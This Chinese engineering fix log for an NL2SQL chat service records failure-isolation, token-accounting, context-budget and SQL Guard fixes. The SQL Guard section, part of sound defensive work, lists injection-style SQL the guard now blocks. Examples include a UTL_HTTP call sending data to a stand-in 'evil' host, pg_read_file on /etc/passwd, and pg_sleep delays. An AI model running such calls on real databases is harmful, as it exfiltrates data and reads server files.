   两条循环只剩「记账 + 更新锚点 + （流式）发事件」，结构上无法再漂移（本项目第三次踩这个模式）。
2. **`sql is None` 确认为唯一失败标记**：与既有 `_finalizeMultiStepDegrade` 的
   `succeeded = [r for r in completed if r.sql is not None]` 同口径，于是降级文案的「完成 N/M 步」
   自动正确；新增 `_hasDataStepResult` 复用同一判据。
3. **全部数据步骤失败则跳过汇总 LLM**（`continue` 而非 `break`，不依赖「汇总步在末尾」的隐含契约），
   落到既有降级收尾 `MSG_MULTI_STEP_DEGRADE_FAILED` —— 汇总 LLM 拿到的只有错误行时只会编造结论。
4. **失败步骤不再污染下游 prompt**：`inject_to_prompt` 与 `StepAggregator._build_prompt` 对
   `sql is None` 的步骤改渲染「无数据 / 不得为其推测」。**空数据块与「查询结果为 0」在下游 LLM
   眼里无法区分**——照常渲染 `[aggregate] []` 会得到「2025 年销售额为 0」这种看似合理、实则编造的结论，
   那样「失败隔离」只是把 500 换成了更隐蔽的错答案。
5. **C4 用显式 kw-only 参数**：`_runQueryWithRetry(..., *, question=None, prior_state=None)`，
   多步调用方传子问题 + 注入文本；`question is not None` 同时作为「多步语境」判据决定是否把主问题
   透传为 `scopeQuestion`。单步调用方不传 ⇒ 逐字节不变。

一处**刻意的行为变更**：步骤错误文案进入用户可见响应（`steps[i].error`），
`该步骤查询生成失败：…` / `该步骤执行失败：…` + 截断 200 字符。选择暴露而非隐藏，是因为
「哪一步失败了、为什么」是多步场景下用户唯一能自我纠正的信息；截断 + `_summarizeExecutionError`
避免把整段堆栈或连接串写进响应。

### 验证（TDD：先 RED 后 GREEN）

| 用例 | RED 证据 | GREEN |
|---|---|---|
| 非流式步骤失败隔离 | `RuntimeError: ORA-00942` 从 API 层穿出（500） | 200 + 步骤 2 `error` 非空 / `sql`·`data` 空 + 步骤 1 完整 + 台账 5 行 + `state.last_sql == steps[0].sql` |
| 流式步骤失败隔离 | 流出 `error` 帧（断言 `'error' == 'done'` 失败） | 无 `error` 事件 + 末帧 `done` + 2 条 `step_result`（0 成功 / 1 失败） |
| 全失败跳过汇总（流式 / 非流式） | —（新增能力） | 汇总 LLM **未**被调用 + `answer == MSG_MULTI_STEP_DEGRADE_FAILED` |
| 重试上下文（C4） | 断言 `'请分步查询 2024 和 2025 年的销售额并对比' == '2025年的销售额是多少'` 失败 | 重试调用 `question == 子问题 != 复合问题`、`priorState` 含「前序步骤结果」、`scopeQuestion == 主问题` |
| 失败步骤注入渲染（单元） | 渲染出 `[aggregate] []` | 「该步骤执行失败」可见 + 无 `[/aggregate]` / `[/entity_list]` |
| 失败步骤汇总 prompt（单元） | 出现「共 0 行」数据块 | 「不得为其推测」可见 |

`test_chat_multi_step.py` 全文件 **17 passed**。

### 变异验证（比「跑在 HEAD 上」更强的证据）

HEAD 工作树不含本轮之前若干未提交批次（`MSG_MULTI_STEP_DEGRADE_FAILED` 等），且首版用例的失败
构造方式与最终版不同，故改用**定向变异**逐条证明用例是真闸（在 `/tmp` 的 worktree 副本里改）：

| 变异 | 结果 |
|---|---|
| `_executeDataStep` 的 `except` 改回 `raise`（还原 C3） | 4 个隔离用例全红，C4 用例仍绿 ⇒ 两缺陷各自独立成闸 |
| 不再向 `_runQueryWithRetry` 传 `question`/`prior_state`（还原 C4） | 仅 C4 用例红，4 个隔离用例仍绿 |
| 还原 `inject_to_prompt` / `_build_prompt` 的失败步骤分支 | 对应单元用例各红一条 |

> 教训：**测试的失败构造方式要与被测缺陷解耦**。第一版 C3 用例靠「第二步 SQL 含专属标记」构造失败，
> 而重试会**重新生成** SQL（内容随 C4 是否修复而变）⇒ C3 用例实际被 C4 绑住。改用「第 N 个数据
> 查询起失败」的序号判定（`_DataQueryFailAdapter`）后两缺陷才真正独立。变异验证会立刻暴露这种耦合。

### 回归

相邻集成套件（9 文件：多步 / 追问级联 / 全局过滤 / chat / 流式 / 模型降级 / L1 路由 / doc_qa）**86 passed**；
全量单元套件 **2243 passed, 2 failed**，两个失败均为既有预存（ADS 加权重排死代码、Starlette
`Header.lower` 版本漂移），本批未触碰。

### code-reviewer 复审

结论 **APPROVE**（0 CRITICAL / 0 HIGH / 2 MEDIUM / 2 LOW），两条 MEDIUM 当场修完：

| 级别 | 问题 | 处理 |
|---|---|---|
| MEDIUM | **步骤错误原文进用户可见响应**：`str(exc)` 经 SQLAlchemy 包装后含 `[SQL: ...]`（内部表/列名）与 `[parameters: ...]`（查询字面量，可能含业务数据），`StepResult.error` 会原样进非流式响应与流式 `step_result` 事件由前端渲染 —— 违反「UI 层友好提示 / 不泄漏敏感数据」。RED 证据里响应确实带出了 `[SQL: SELECT SECRET_COL …]` 与 `{'n': 'ACME-机密客户'}`。 | 新增 `_userFacingErrorText`：剥掉两段细节、剥空时兜底；细节留给服务端日志与**回灌 LLM 的重试反馈**（并加了「反馈里仍含细节」的正向对照断言，防止退化成一刀切截断） |
| MEDIUM | **重试生成的 token 在「重试执行也失败」时丢账**（原 §2.3 M7 的一部分）：那次生成花了钱却不进台账；原用例的 `purpose` 精确列举断言把它固化成了期望（只期望 2 个 `nl2sql` 行）。 | `_attachRetryGenTokens` 把 token 挂到上抛的原始异常私有属性上（**不改类型/消息**，API 层按类型映射 HTTP 状态），`_executeDataStep` 取出落账 |
| LOW ×2 | `_hasDataStepResult` 语义边界（汇总步不在末尾的畸形计划）；C4 用「是否传 `question`」隐式推断多步 | 前者 docstring 写明（非 bug、生产不可达）；后者改为显式 kw-only `scope_question` |

### 遗留

1. ~~**「重试执行也失败」时重试生成的 token 仍会丢账**~~ ✅ **复审中已修**（见上）。
   ~~**单步**路径的两处 `_runQueryWithRetry` 调用未取 `_retryGenTokens` 记账~~、
   ~~**重试生成本身抛错**时 `Nl2SqlError.tokens` 未记账~~、
   ~~C3 只报**第一次**执行错误，重试后的新错误看不到~~ —— 三项均 ✅ **已完成（2026-09-26）**，见 §11。
   当年提示「要小心与 `_callWithFallback` 已写的 `fallback_sql` 行重复计数」已核验为**不适用**：
   重试生成那次调用**不走** `_callWithFallback`（它直接 `self._nl2sql.generateSql(self._llmFactory(cfg), …)`），
   而 `fallback_<purpose>` 行只在 `_callWithFallback` 内部降级时才写 ⇒ 无重叠（见 §11 §7）。
2. `_callWithFallback` 全模型失败时的浪费 token 同属预存缺口。
3. ~~**C 路径（`_isFollowUpRetryCandidate` 兜底）的 `global_filters` 对称缺口**仍未补
   （`chat_service.py` 非流式与流式两处，前一批遗留）。~~ ✅ **已完成（2026-09-26）**，见 §10。
4. **单步流水线的硬失败仍直接抛给 API 层 —— 这是有意的**：单步失败会先回退多步拆解，两条都失败
   才对外报错；C3 只承诺「多步序列内部的失败隔离」。注意 `except Exception` **不捕获**
   `asyncio.CancelledError`（BaseException），故本批隔离不覆盖客户端断连（H4 仍待处理）。

---

## 10. 修复记录：C 兜底分支的 global_filters 对称缺口（2026-09-26）

**SSOT**：`Harness/changes/fix-c-fallback-global-filters/summary.md`（§3 P0 第 5 项，修复前的 P0 唯一剩余）。

### 根因

C 兜底分支（`_isFollowUpRetryCandidate` 命中 → `_prepareFollowUpMultiStep` → 多步重跑）不传
`global_filters`，而同级 B 分支（FOLLOW_UP 且上一轮多步）传 —— 非流式与流式**两侧同样缺失**。
用户可见后果：上一轮是带跨步口径约束的多步问题时，一句省略式追问若先进 C 兜底，
改写后重跑的每一步 SQL 都丢掉 `[global_constraints]`（外购/内外贸/站点等），
口径与上一轮不一致且无报错。

真正的根因不是「漏写一行」，而是**同一份多步前置知识被复制到 4 个入场点、靠人记得传参** ——
这个模式已漏过两次（C1/C2 流式那次 + 本次 C 兜底两侧）。

### 修复（`app/services/chat_service.py`）

抽取收敛进共享前置 `_prepareFollowUpMultiStep`（SSOT）：返回元组 4 → **5**，末位
`GlobalFilters | None`；4 个调用点（非流式 B/C、流式 B/C）改为纯透传。抽取点 **4 → 1**，
结构上不可能再漏。不变式：抽取仍只在「改写成功且已拆出多步计划」之后发生；抽取 token 仍由
`_resolveGlobalFilters` 内部落 `multistep_global_filter` 台账、不进 `initial_tokens`（避免重复计价）。

附带：`GlobalFilters` 在 5 处用作注解却从未 import（`from __future__ import annotations` 掩盖了
运行时错误），一并补上。

### 验证（TDD：先 RED 后 GREEN）

3 个新用例（cascade 非流式 C / global-filter 文件非流式 C + 流式 C）。RED 时三条都停在
`[global_constraints]` 缺失（且「3 次计划调用」已成立 ⇒ 链路走到了，缺的确实是约束注入）。

有意为之的两条断言设计：① 只查 `planCalls[1:]` —— 第 1 次是 C 首轮**单步**，本就不该有块；
reviewer 建议的负向对照（`not in planCalls[0]`）也已补上，防「过度注入」回归；
② 断言提取器输入含**改写后的问题** —— 这是「按 dto2 抽取」与「按 dto 抽取」的分野。

### 回归

- 两套件 **20 passed**；
- 相邻套件（multi_step / service_state / l1_routing / stream_api / model_routing_fallback）**54 passed**；
- 全部 chat 集成套件（`test_chat_*.py`，12 文件）**130 passed**；
- chat 相关单元套件 **254 passed, 1 failed**（失败为预存 ADS 加权重排死代码用例，与本批无关）。

### code-reviewer 复审

**APPROVE**：0 CRITICAL / 0 HIGH / 0 MEDIUM / 2 LOW。

| 级别 | 问题 | 处理 |
|---|---|---|
| LOW | 用例缺负向对照（未断言 C 首轮单步**无**约束块） | 当场补 3 处断言 |
| LOW | 窄路径下 L1.5（`:1051`，结果被丢弃）与 C 兜底（`:1956`）可能各抽一次 | 预存行为、非本次引入；两次是不同问题且各自独立计量（无重复计一笔、无丢账）⇒ 记 backlog |

### 遗留

1. ~~**M7「重试错误只剩第一次」仍未处理**~~ ✅ **已于 2026-09-26 修复**，见 §11
   （连同单步路径的用量漏账、重试生成失败的 `Nl2SqlError.tokens` 漏账一并闭合）。
2. L1.5 的「先抽取后判能否拆步」（`:1051`）在拆步失败时白花一次 LLM 调用 —— 预存，
   与本次同源（抽取点位置不当），可考虑一并收敛到「拆步成功后再抽」。
3. 同类注解未 import 的预存隐患 6 处（`StepResultRead` / `AgentLoopResult` / `KpiCatalog`）。

---

## 11. 修复记录：M7 回灌重试的二次失败详情与用量（2026-09-26）

**SSOT**：`Harness/changes/fix-chat-retry-failure-details/summary.md`（§2.3 M7；也是 §9 遗留 1 与 §10 遗留 1 的收口）。

### 问题（§2.3 M7 的完整形态）

`_runQueryWithRetry` 首次执行失败后把错误回灌给 `generateSql` 重试一次。二次失败
（重试生成失败 / 重试执行仍失败）此前只有一行日志，三件事同时丢失：

1. **用户可见文案只报第一次错误** —— 用户读「该步骤执行失败：ORA-00942 表或视图不存在」，
   结论是「这条 SQL 一上来就写错了」；真相是「首次错了、回灌重试**同样**错」。排查方向完全不同。
2. **重试那条 SQL 全文无处可查**（重试会重新生成 SQL，与首次那条可能不同）。
3. **用量漏账**（核心约束 #3 在失败路径上不成立），且不止一处：
   - 重试生成成功但重试执行失败 → 多步路径 C3 那批已修、**单步两条路径（非流式/流式）未修**；
   - 重试**生成自己失败** → `Nl2SqlError.tokens` 两条路径**都没人取用**（复审新发现）。

### 修复（`app/services/chat_service.py`）

沿用「挂私有属性、不改异常类型/消息」的既定模式（API 层按异常类型映射 HTTP 状态）：

- `_attachRetryFailure` / `_retryFailure`（`_RetryFailure(stageLabel, error)`）：二次失败详情；
- `_attachRetryGenTokens` / `_retryGenTokens`：重试生成用量，**两个分支都挂**
  （生成成功用 `SqlResult` 用量；生成失败用 `self._consumedTokens(genErr)` 读 `Nl2SqlError.tokens`）；
- `_stepFailedError`：文案改为「首次：…；重试{stageLabel}：…」，**两段各自**经
  `_userFacingErrorText` 脱敏（剥 `[SQL:` / `[parameters:` + 兜底）并**各自**限量 90 字，
  再套总上限 200 —— 整体尾部截断会让长首次原因把重试原因整段挤掉（实测，见 SSOT §2.3）；
- `_accountRetryGenUsage`：取用量 → 落账 → 返回增量，**单步两处 + 多步一处共用一个入口**；
- 重试执行仍失败时把**重试 SQL** 打进服务端日志（截 2000 字）。

### 验证（TDD：3 处行为级 RED）

| RED | 触发方式 | 红灯原文（摘要） |
|---|---|---|
| 文案缺重试那一步 | 临时移除唯一一行 `_attachRetryFailure` | `未交代重试这一步：该步骤执行失败：ORA-00942: 表或视图不存在` |
| 重试生成失败漏账 | 新用例（回灌提示词命中 → 回复无 ```sql 围栏） | `nl2sql 台账行数不符：[(20,10),(20,10),(20,10)] / assert 3 == 4` |
| 长首次原因挤掉重试原因 | 首次原因 500 字 | 拼接结果里重试原因整段消失 |

GREEN：单元 16 passed、`test_chat_multi_step.py` 24 passed、chat 集成切片 126 passed。

### 复审

`code-reviewer` 第一轮 APPROVE（0 CRITICAL / 0 HIGH / 2 MEDIUM / 3 LOW），两条 MEDIUM 当场修完
（重试生成失败的 token 漏账；**类 docstring 的因果判断被证伪**）+ 一条 LOW（两段各自限量）；
第二轮 APPROVE（**0 / 0 / 0 / 1**，唯一 LOW 是 `setattr` 与「不可变」规则的形式性偏离，经论证不改）。
`security-reviewer` **PASS-WITH-WARNINGS**（0 / 0 / 0 / 2）。详见 SSOT §7。

> ⚠️ **被证伪的假设（值得单独记）**：本批初稿断言「非流式硬失败会因 `getDb` 回滚而丢掉
> 台账行，故不必断言该路径」。**错**：`TokenUsageService.recordUsage` 每次调用都
> `session.add()` + `await session.commit()`，台账行在每次 LLM 调用后即已提交，
> `rollback()` 只能回滚未提交的工作。据此改正了 docstring，并补上此前**完全缺失**的
> 非流式硬失败用例（该用例同时钉住：非流式硬失败是异常穿透 ASGI 重抛，不是 500 响应）。
> 教训：**「已提交」与「事务内」的区别必须回到代码确认**，别由 `getDb` 有 rollback 就外推。

### 遗留

1. L1.5「先抽取后判能否拆步」（`:1051`）与窄路径下被丢弃的一次抽取 —— 预存，见 §10 遗留 2。
2. 单步回退多步时不解析/不传 `global_filters`（显式多步路径 `:1090` 有传）—— 预存的不对称，
   与 §10 同族（「同一份多步前置知识被复制到多个入口」），本次未动。
3. 两条 `B904`（`raise firstErr` 未带 `from`）保留：服务端日志已 `exc_info=True` 打全链，
   显式 `__cause__` 会改变异常链在 API 层的呈现路径，超出本批「只挂私有属性」的边界。
4. **新增披露面（security LOW-1，待观测再修）**：重试**生成失败**时首次把 `genErr` 文案带给用户；
   若 `genErr` 是 `LlmClientError`，其 `.message` 内嵌底层 provider 异常的 `str(exc)`。当前无观测
   证据表明 provider 错误体会回显请求内容（脱敏契约针对的是 SQLAlchemy 的**确定性**泄漏），故不猜着修；
   若日后真的观测到回显，对该段非 `Nl2SqlError` 的异常改走固定文案即可（不改契约）。
5. **既有行为**：`retryErr` 经 `%s` 格式化会把 `[parameters: {…}]` 的**参数值**写进服务端日志
   （旧代码早已如此，本批未扩大）；属服务端日志留存/脱敏策略议题，见 §2.4 同类项。

---

## 12. 修复记录：H5 向量失败降级 + H3 历史预算（2026-09-26）

**SSOT**：`Harness/changes/fix-chat-recall-fallback-and-context-budget/summary.md`（§2.2 H5 / H3；同时闭合 §3 P1 第 5、6 项）。

### 问题（§2.2 H5 / H3 的完整形态）

**H5 —— 降级路径不是免检路径。** `_selectRelevantClasses` 的**五个**回退分支（检索异常 /
无命中 / 命中全被 ODS 过滤 / 命中全为 ODS / 命中解析不出真实类）一律
`return list(allClasses)`：不过滤 ODS、不截 `CLASS_FILTER_MAX_CLASSES`。于是
2026-09-19 ODS_BPARTNER 事故（LLM 在贴源备份表上幻觉属性名）**只要 Milvus/embedding
挂掉就原样复现**，而且挂掉是静默的（用户只看到答得差）；更糟的是本系统的规模化闸门
（上限 30）在最需要它的时刻失效 —— 表越多越选错，降级时反而全量灌进 prompt。

**H3 —— 计了量但没控量。** `_buildContextPrompt` 的返回值被注入 plan / SQL / answer /
聚合各阶段共 9 处 prompt（`grep -c contextPrompt`），却对长度零约束。一条超长答案或长
CTE 会**逐轮重复注入**：轮次一长，每轮 prompt 成本随历史线性膨胀（钱与延迟同时涨）。

### 修复（`app/services/chat_service.py`）

- **`_fallbackRecall`（H5）**：五个分支收敛到唯一出口 —— ODS 过滤（显式点名 ODS 表的问题
  除外）→ `_rankByLayer(dimension_hint=False)` → `[:CLASS_FILTER_MAX_CLASSES]` → 单点
  warning → `ClassRecallInfo(mode="fallback", truncated=…)`。
  - **排序必须先于截断**：入参是库表顺序（DB 自然序），直接截前缀 = 随机丢表；
  - `dimension_hint=False` 是刻意的：入参本就是全量类（DIM 已在其中），DIM 补拉是给召回
    子集用的，会引入一次 DB 读取；`False` 让该 helper 成为**纯排序、不可能抛错**（降级
    路径的首要性质）；
  - 退化场景（全库皆 ODS）保留原列表而非返回空 schema（空 schema 会让所有问题变成
    「无法回答」），单独记一行；
  - **日志单点出口**：回退率按「含 `reason=` 的行」聚合，同一事件两行就翻倍 ⇒ 调用方一律
    不打 `reason=`；退化那行用 `scene=`（场景名仍可见，紧随其后的主行带同 `total` 可对齐）。
- **`_fitPartsToBudget` + 三个常量（H3）**：单条正文 500 / 历史 SQL 500（**分开限量**，
  合并限量会让一条长答案把同轮的 SQL 整段挤掉，而追问靠历史 SQL 复用）+ 拼接总预算 4000。
  超预算**丢最旧的整块**（绝不裁最新一轮 —— 它是 REFINE/FOLLOW_UP 的锚点）；最新块自身
  超预算才裁它，保证任何配置下总长恒有界。
  > **未采纳本评估文档 §3 P1 第 6 项的原建议（复用 `_clipText`）**：`_clipText` 是头裁，
  > 而这里要保的是**最新**轮次 —— 头裁会每轮都保留最老的 5 轮、永远看不到最新一轮的 SQL。
- **`_getClassFilterMaxClasses`**：非正值（0/负）按非法处理返默认 30 —— 0 会让闸门**静默
  失效**（`ranked[:0]` 返空、`ranked[:-5]` 返「除末位以外全部」、`truncated` 判定同时失真），
  而它是正常裁剪与 H5 降级路径**共用的唯一闸门**。
- **前端文案**：`classRecallFallback` 由「本次已加载**全部**数据表」改为「已按数仓**分层顺序**
  选取数据表（张数受召回窗口上限约束）」—— 旧文案在 H5 之后是**假话**，属必须同步的
  用户可见契约（i18n 编译期注入 ⇒ 必须重建前端镜像）。

### 验证（TDD：RED 证据）

部署后用**反向探针**重放修复前形态（`_fallbackRecall` 改回 `list(allClasses)`、
`_buildContextPrompt` 改回不裁剪），10 failed / 5 passed：

```
E  AssertionError: assert 5069 <= 4000          ← H3 无预算
E  AssertionError: assert 'msg8' not in '用户：msg8-…'   ← H3 丢的是最新而非最旧
E  assert 2 not in {2, 4}                        ← H5 ODS 未过滤
E  assert {2,4} == {4} / {2,3,5} == {5}          ← H5 未截断
E  assert 37 == 30                               ← H5 降级返回全量
```

收口期**真机探针**又发现同一根因的第三处：退化分支那行也带 `reason=` ⇒ 该场景回退率会
被算成 2 倍（改用 `scene=` 后闭合，并补断言 `caplog.text.count("reason=search_error") == 1`）。

GREEN：新用例 15 passed；`test_chat_service.py` + `test_chat_step_error_text.py` 146 passed
（唯一失败是预存的 ADS 死代码用例）；chat 集成切片 82 passed；全量 unit 2273 passed /
2 项预存失败；前端 `MessageItem.test.tsx` 25 passed；ruff 诊断与 HEAD 逐条一致（零新增）。

### 部署验证

镜像重建（后端 22.1s + 前端 `--no-cache` 走 npmmirror）后：后端 `chat_service.py` md5
与仓库一致；容器内行为探针确认 —— 截断后留下的全是 ADS（**证明排序在截断之前**：截前缀
本会留下 DWD）、显式 ODS 请求保留贴源表、cap 守卫 `0→30 / -5→30 / 7→7`、全 ODS 退化不返空、
H3 端到端 3049 ≤ 4000 且「留最新/丢最旧/`[SQL:` 标记完整」；前端 bundle 新串命中、旧串 0 残留；
`/api/v1/health` 直连与经 nginx 均 200。

### 复审

| 轮次 | 结论 |
|---|---|
| security-reviewer（实现后） | **PASS-WITH-WARNINGS** — 0 CRITICAL / 0 HIGH / 0 MEDIUM / 2 LOW（1 条当场修） |
| code-reviewer（收口复审，本批最终形态） | **APPROVE-WITH-NITS** — 0 CRITICAL / 0 HIGH / 0 MEDIUM / 2 LOW（两条「不改但记录」） |

收口复审对四条不变量做了**对抗式**核对（不改代码、不跑 pytest，逐行读 diff + 最终形态）：

1. **降级路径不可能抛错** —— `_rankByLayer(dimension_hint=False)` 的 `if dimension_hint:` 分支
   确实跳过 `_fetchAllDimClasses`（无 DB 读）；唯一剩下的 `system_config` 读取被
   `_getClassFilterMaxClasses` 的 `except (TypeError, ValueError)` + 兜底 `except Exception`
   双重包裹。
2. **`_fitPartsToBudget` 的长度核算无差一** —— `extra = len(part) + (1 if kept else 0)` 恰对应
   `"\n".join` 的 `sum(len) + (n-1)`；且「兜底裁最新」分支只可能在 `kept` 单元素时触发（若最新块
   已超预算，第二轮必然 `break`），与注释一致。函数纯净：只写局部 `kept`，入参 `parts` 不动。
3. **回退率聚合口径** —— 五个场景下每个降级事件**恰好一行**含 `reason=`；`search_error` 的堆栈行
   与退化分支的 `scene=` 行均刻意不含。`truncated = len(ranked) > max_classes` 在 fallback 模式下
   现在才有意义（此前恒 False）。
4. **前端契约** —— `MessageItem.tsx:75-87` 是唯一消费者，`mode === "fallback"` 覆盖截断提示；
   无任何消费者假设「fallback ⇒ 已加载全部表」。

同时确认两条测试**不是假绿**：`test_fallback_ranks_by_layer_before_truncation` 把 ADS/DWD 放在输入
**尾部**，截前缀必挂（真断言）；ODS 过滤用例对旧 `return list(allClasses)` 必红（真回归覆盖）。

**两条 LOW 均为「不改但记录」**（完整理由见 SSOT §7 末两行）：负预算下 `_clipText` 的负索引切片会让
「恒有界」断言失真（当前预算硬编码 4000，不可达；**触发器**：一旦改成可配置就必须加 `max(budget, 0)`），
以及退化分支日志措辞「保留原列表」在类数 > 上限时与事实不符（真实意图是「绝不返回空 schema」，
措辞歧义由紧随其后带同 `total` 的主行消除；**触发器**：若运维需单看该行判断则改写措辞）。
两者都不改代码的**共同理由**：任何改动（哪怕只改注释）都会让 §8 的 `md5 MATCH` 失效，而那是
「容器 == 仓库」的唯一凭据，留一处不匹配会给下次部署留下「是否跑了旧代码」的假信号。

### 遗留

1. **`_clipText` 按码点切片可能切开代理对**（security LOW，跨切面）：9+ 调用方，应单独一批
   统一加固；本批新调用点与既有调用点风险同构，未**扩大**暴露面。
2. **显式点名 ODS 表即可豁免过滤**（security LOW）：这是**质量闸门**而非安全边界（安全边界
   是 SQL Guard 的只读校验）；收紧会让「ODS_BPARTNER 里有什么」这类正当问题无法回答。保留。
3. **`StepExecutionContext.context` 死接线**（security INFO）：设置于 `chat_service` 两处、
   `step_query_planner` 从不读取 —— 预存，与本批无关。
4. **未做端到端「真实降级」演练**：需停 Milvus / embedding provider，会影响同时在用的会话；
   行为等价性由容器内探针（真机代码跑真实过滤/排序/截断/预算逻辑）+ 15 个单元用例覆盖。
5. **两条有待触发条件的 LOW**（收口复审，见上）：负预算的 `_clipText` 负索引切片、退化分支日志措辞
   —— 均带明确触发条件，触发时**必须**与代码改动同批处理（改代码即需重新部署并重录 md5 证据）。

---

## 13. 修复记录：SQL Guard 侧信道黑名单 + 拒绝原因回注（2026-09-26）

SSOT：`Harness/changes/fix-sql-guard-side-channel-and-reject-feedback/`（含 9 段完整记录、两轮审查逐条处置、RED 证据）。

### 问题（§2.3 M1 / M2 的完整形态）

1. **M1 拦得不够**：`_FORBIDDEN_FUNCTIONS` 只覆盖写/文件类函数，**侧信道整类缺失** ——
   `SELECT pg_sleep(5)`（拖住连接 = DoS + 时间盲注）、`UTL_HTTP.REQUEST('http://evil/?'||数据)`
   （出网外泄）、`dblink(...)`（跨库）、`LOAD_FILE`/`UTL_FILE`（读服务器文件）、
   `pg_terminate_backend`/`pg_advisory_lock`（进程与锁控制）全部以「首 token 合法」通过白名单。
   这是「只读 SELECT」核心约束的**实质绕过**，不是理论问题。
2. **M1 附带（评估文本需修正）**：原写的「`INTO` 过度拦截（含良性 `SELECT…INTO`）」经实测不成立，
   见下表与 M1 行更正。
3. **M2 拦了不说清**：重试循环只回注固定文案，**原因已在 `exc` 里、也进了日志，但没进 prompt**
   ⇒ 模型看不到违规点，只能反复盲改，重试预算烧完整问失败。

### 修复

| 位置 | 改动 |
|---|---|
| `business_db_pool.py` | 三集合分口径：`_FORBIDDEN_FUNCTIONS`（裸名 + 引号归一 + 不看形态）、`_FORBIDDEN_CALLS`（须调用形态 `(`）、`_FORBIDDEN_PACKAGES`（须包名形态 `.`）；判定前 `_unquoteIdentifier` 剥 `"x"`/`` `x` ``/`[x]`、前瞻时跳过注释；把 `T.Literal.String.Symbol` 的判定**提前**到字面量跳过之前 |
| `nl2sql_service.py` | `except SqlSafetyError` 分支把 `str(exc)`（**只含原因，`exc.sql` 不进消息体**）拼进 `errors`；`_buildUserPrompt` 的 errors 段补 `_sanitizeContext`（与 executionError 段同口径） |

**关键设计判断**：「调用形态」与「包名形态」必须分开 —— 纯函数名只可能以 `(` 调用，
若把 `.` 也当命中，`SELECT sleep.col FROM foo sleep`（黑名单词作表别名）会被误杀。
**三集合不可合并**：`sleep`/`benchmark` 是普通词，裸名匹配会杀掉 `SELECT COUNT(*) AS sleep`。

### 验证（TDD：先 RED 后 GREEN）

- **RED-1**（实现前）：19 例「必须拒」全部 `DID NOT RAISE SqlSafetyError`，5 例「必须放行」全绿（防过拦对照）。
- **RED-2**（反向探针）：把实现退回朴素版（不剥引号、前瞻不跳注释），恰好 `"pg_sleep"(5)` / `` `sleep`(10) `` / `pg_sleep /*c*/ (5)` 三例转红 ⇒ 证明新代码**承重**而非装饰。
- **RED-4**（复审后二次循环）：13 例红（11 例漏拦 + 2 例误杀），逐条来自两位审查的实测清单。
- GREEN：`test_datasource_pool.py` 104 passed、`test_nl2sql_service.py` 102 passed。
- **零误杀面（探针）**：按黑名单全词表在 **prod `qa_metadata`** 的 `ontology_class`/`ontology_property`
  名字上做去噪子串匹配 → **命中 0 行** ⇒ 现网不存在会因本批被误拒的类/属性。

### `INTO` 实测（修正 M1 行描述）

```
REJECT  SELECT a FROM t INTO x / SELECT a INTO newtab FROM t     ← PG 建表（写）
REJECT  SELECT a INTO OUTFILE '/tmp/x' FROM t                    ← MySQL 写文件
REJECT  SELECT a INTO @v FROM t                                  ← MySQL 变量赋值
ACCEPT  SELECT "into" FROM t / SELECT into_col FROM t            ← 引号标识符（唯一合法写法）
```

真实 PostgreSQL 实测 `SELECT 1 AS into` **合法**、`SELECT 1 AS "into"` 亦合法 ⇒ 唯一误拒是
「未加引号的 `AS into` 别名」。**决策原则**：安全闸门的**误拒**可由 M2 的自愈反馈消解（模型看到
「禁止的 SQL 操作: INTO」即改名），**漏拦不可自愈**（数据已出去）⇒ 闸门一律取过拦偏向，不为此引入 shape 判定。

### 审查（两轮，均找出真缺陷 —— 本批经历「实现 → 审查 → 再 RED → 再 GREEN」）

| 轮次 | 首轮结论 | 处置 |
|---|---|---|
| code-reviewer | **WARNING**（0/1/1/2） | HIGH（引号族绕过）+ MEDIUM（点号形态误杀）当场修 |
| security-reviewer | **FAIL**（0/2/4/4） | 2 HIGH（`pg_sleep_for`/`pg_sleep_until`、引号族）+ 3 MEDIUM（`DBMS_LOB`/`MASTER_POS_WAIT`/`lo_put`）+ 1 LOW 当场修 |

**两轮相互独立地命中同一个 HIGH**（引号包裹的 `_FORBIDDEN_FUNCTIONS` 族：`SELECT "nextval"('s')`
可推进序列、`"pg_read_file"('/etc/passwd')` 可读文件）—— 该形态属**预存**绕过（`String.Symbol`
被字面量分支跳过），但本批已引入归一化解药却只做了一半，故一并修掉，不留「同一手法一半能堵一半不能」的矛盾。
**教训**：以「补黑名单」为目标的批次，审查必须要求**可执行的对照表**（逐形态实测 ALLOWED/REJECTED），
否则读码审查会漏掉整个「枚举完整性」维度 —— 本次两轮审查给出的正是这种表，且都被转成了新用例。

### 遗留（残差）

1. **库侧无只读兜底（security MEDIUM，结构性）**：黑名单是**枚举式**防御（本批实测即抓到
   `pg_sleep_for`、`DBMS_LOB.LOADFROMFILE`、`MASTER_POS_WAIT`、`lo_put` 等漏项），解析层永远追不上
   方言/自定义/未来新增函数。真正的闸门应是**库侧只读角色 + 服务端 `statement_timeout`**
   （实测 `grep statement_timeout|READ ONLY` 在 `business_db_pool.py`/`config.py` **零命中**）。
   ✅ **应用层已修（2026-09-27，见 fix-sql-guard-db-side-readonly）**——PG `SET TRANSACTION READ ONLY`
   + MySQL `SET SESSION TRANSACTION READ ONLY` + Oracle `ALTER SESSION SET READ ONLY` 在事务级/
   会话级强制只读；详见 [fix-sql-guard-db-side-readonly](../changes/fix-sql-guard-db-side-readonly/summary.md)。
   ⏳ **库侧授权（DBA 部分）等运维执行**：脚本就绪于
   [`scripts/db-readonly-account-setup.sql`](../../scripts/db-readonly-account-setup.sql)，含三方言
   只读账号 + 敏感函数/包撤销 + Resource Manager 配置。
   顺带纠正 `nl2sql-engine.md` 原写的「连接级 `statement_timeout`」（不存在）与 `sql_guard.py` 路径漂移。
2. **`(pg_sleep)(5)` 放行**（security LOW）：三方言下 `(func)(args)` 均非合法调用语法（不会执行），`_callShape` 已注明。
3. **安全校验失败日志不截断**（code LOW）：`logger.warning(…, exc)` 受 LLM `max_tokens` 上界约束，低危，记录待清理。
4. ~~**M3 仍未做**：`QueryPlan.from_dict` 吞解析错误（§3 P1 第 9 项本批只完成 M1/M2 两项）。~~
   ✅ **已做（2026-09-26）**，见 §14（H6 + M6 + M3 批次），§3 P1 第 9 项就此闭合。

### 部署验证（2026-09-26）

- **镜像重建**（非 `docker cp`）：`docker compose build backend` → `up -d backend`，容器日志出现
  `Application startup complete.`；
- **容器代码 == 仓库代码**：两个改动文件 md5 逐一对照 **MATCH**
  （`business_db_pool.py b0cc2f4b…`、`nl2sql_service.py 6a91c5c6…`）；
- **容器内真机探针**（真实模块，非测试替身）：**14 例「必须拒」全拒 / 6 例「必须放行」全放行 /
  M2 消息含原因且不含被拒 SQL** → `PROBE PASS`；
- **网关**：重建容器后 `/api/v1/health` 直连 8000 与经 nginx 5173 **均 200**（上游解析持久化修复有效）；
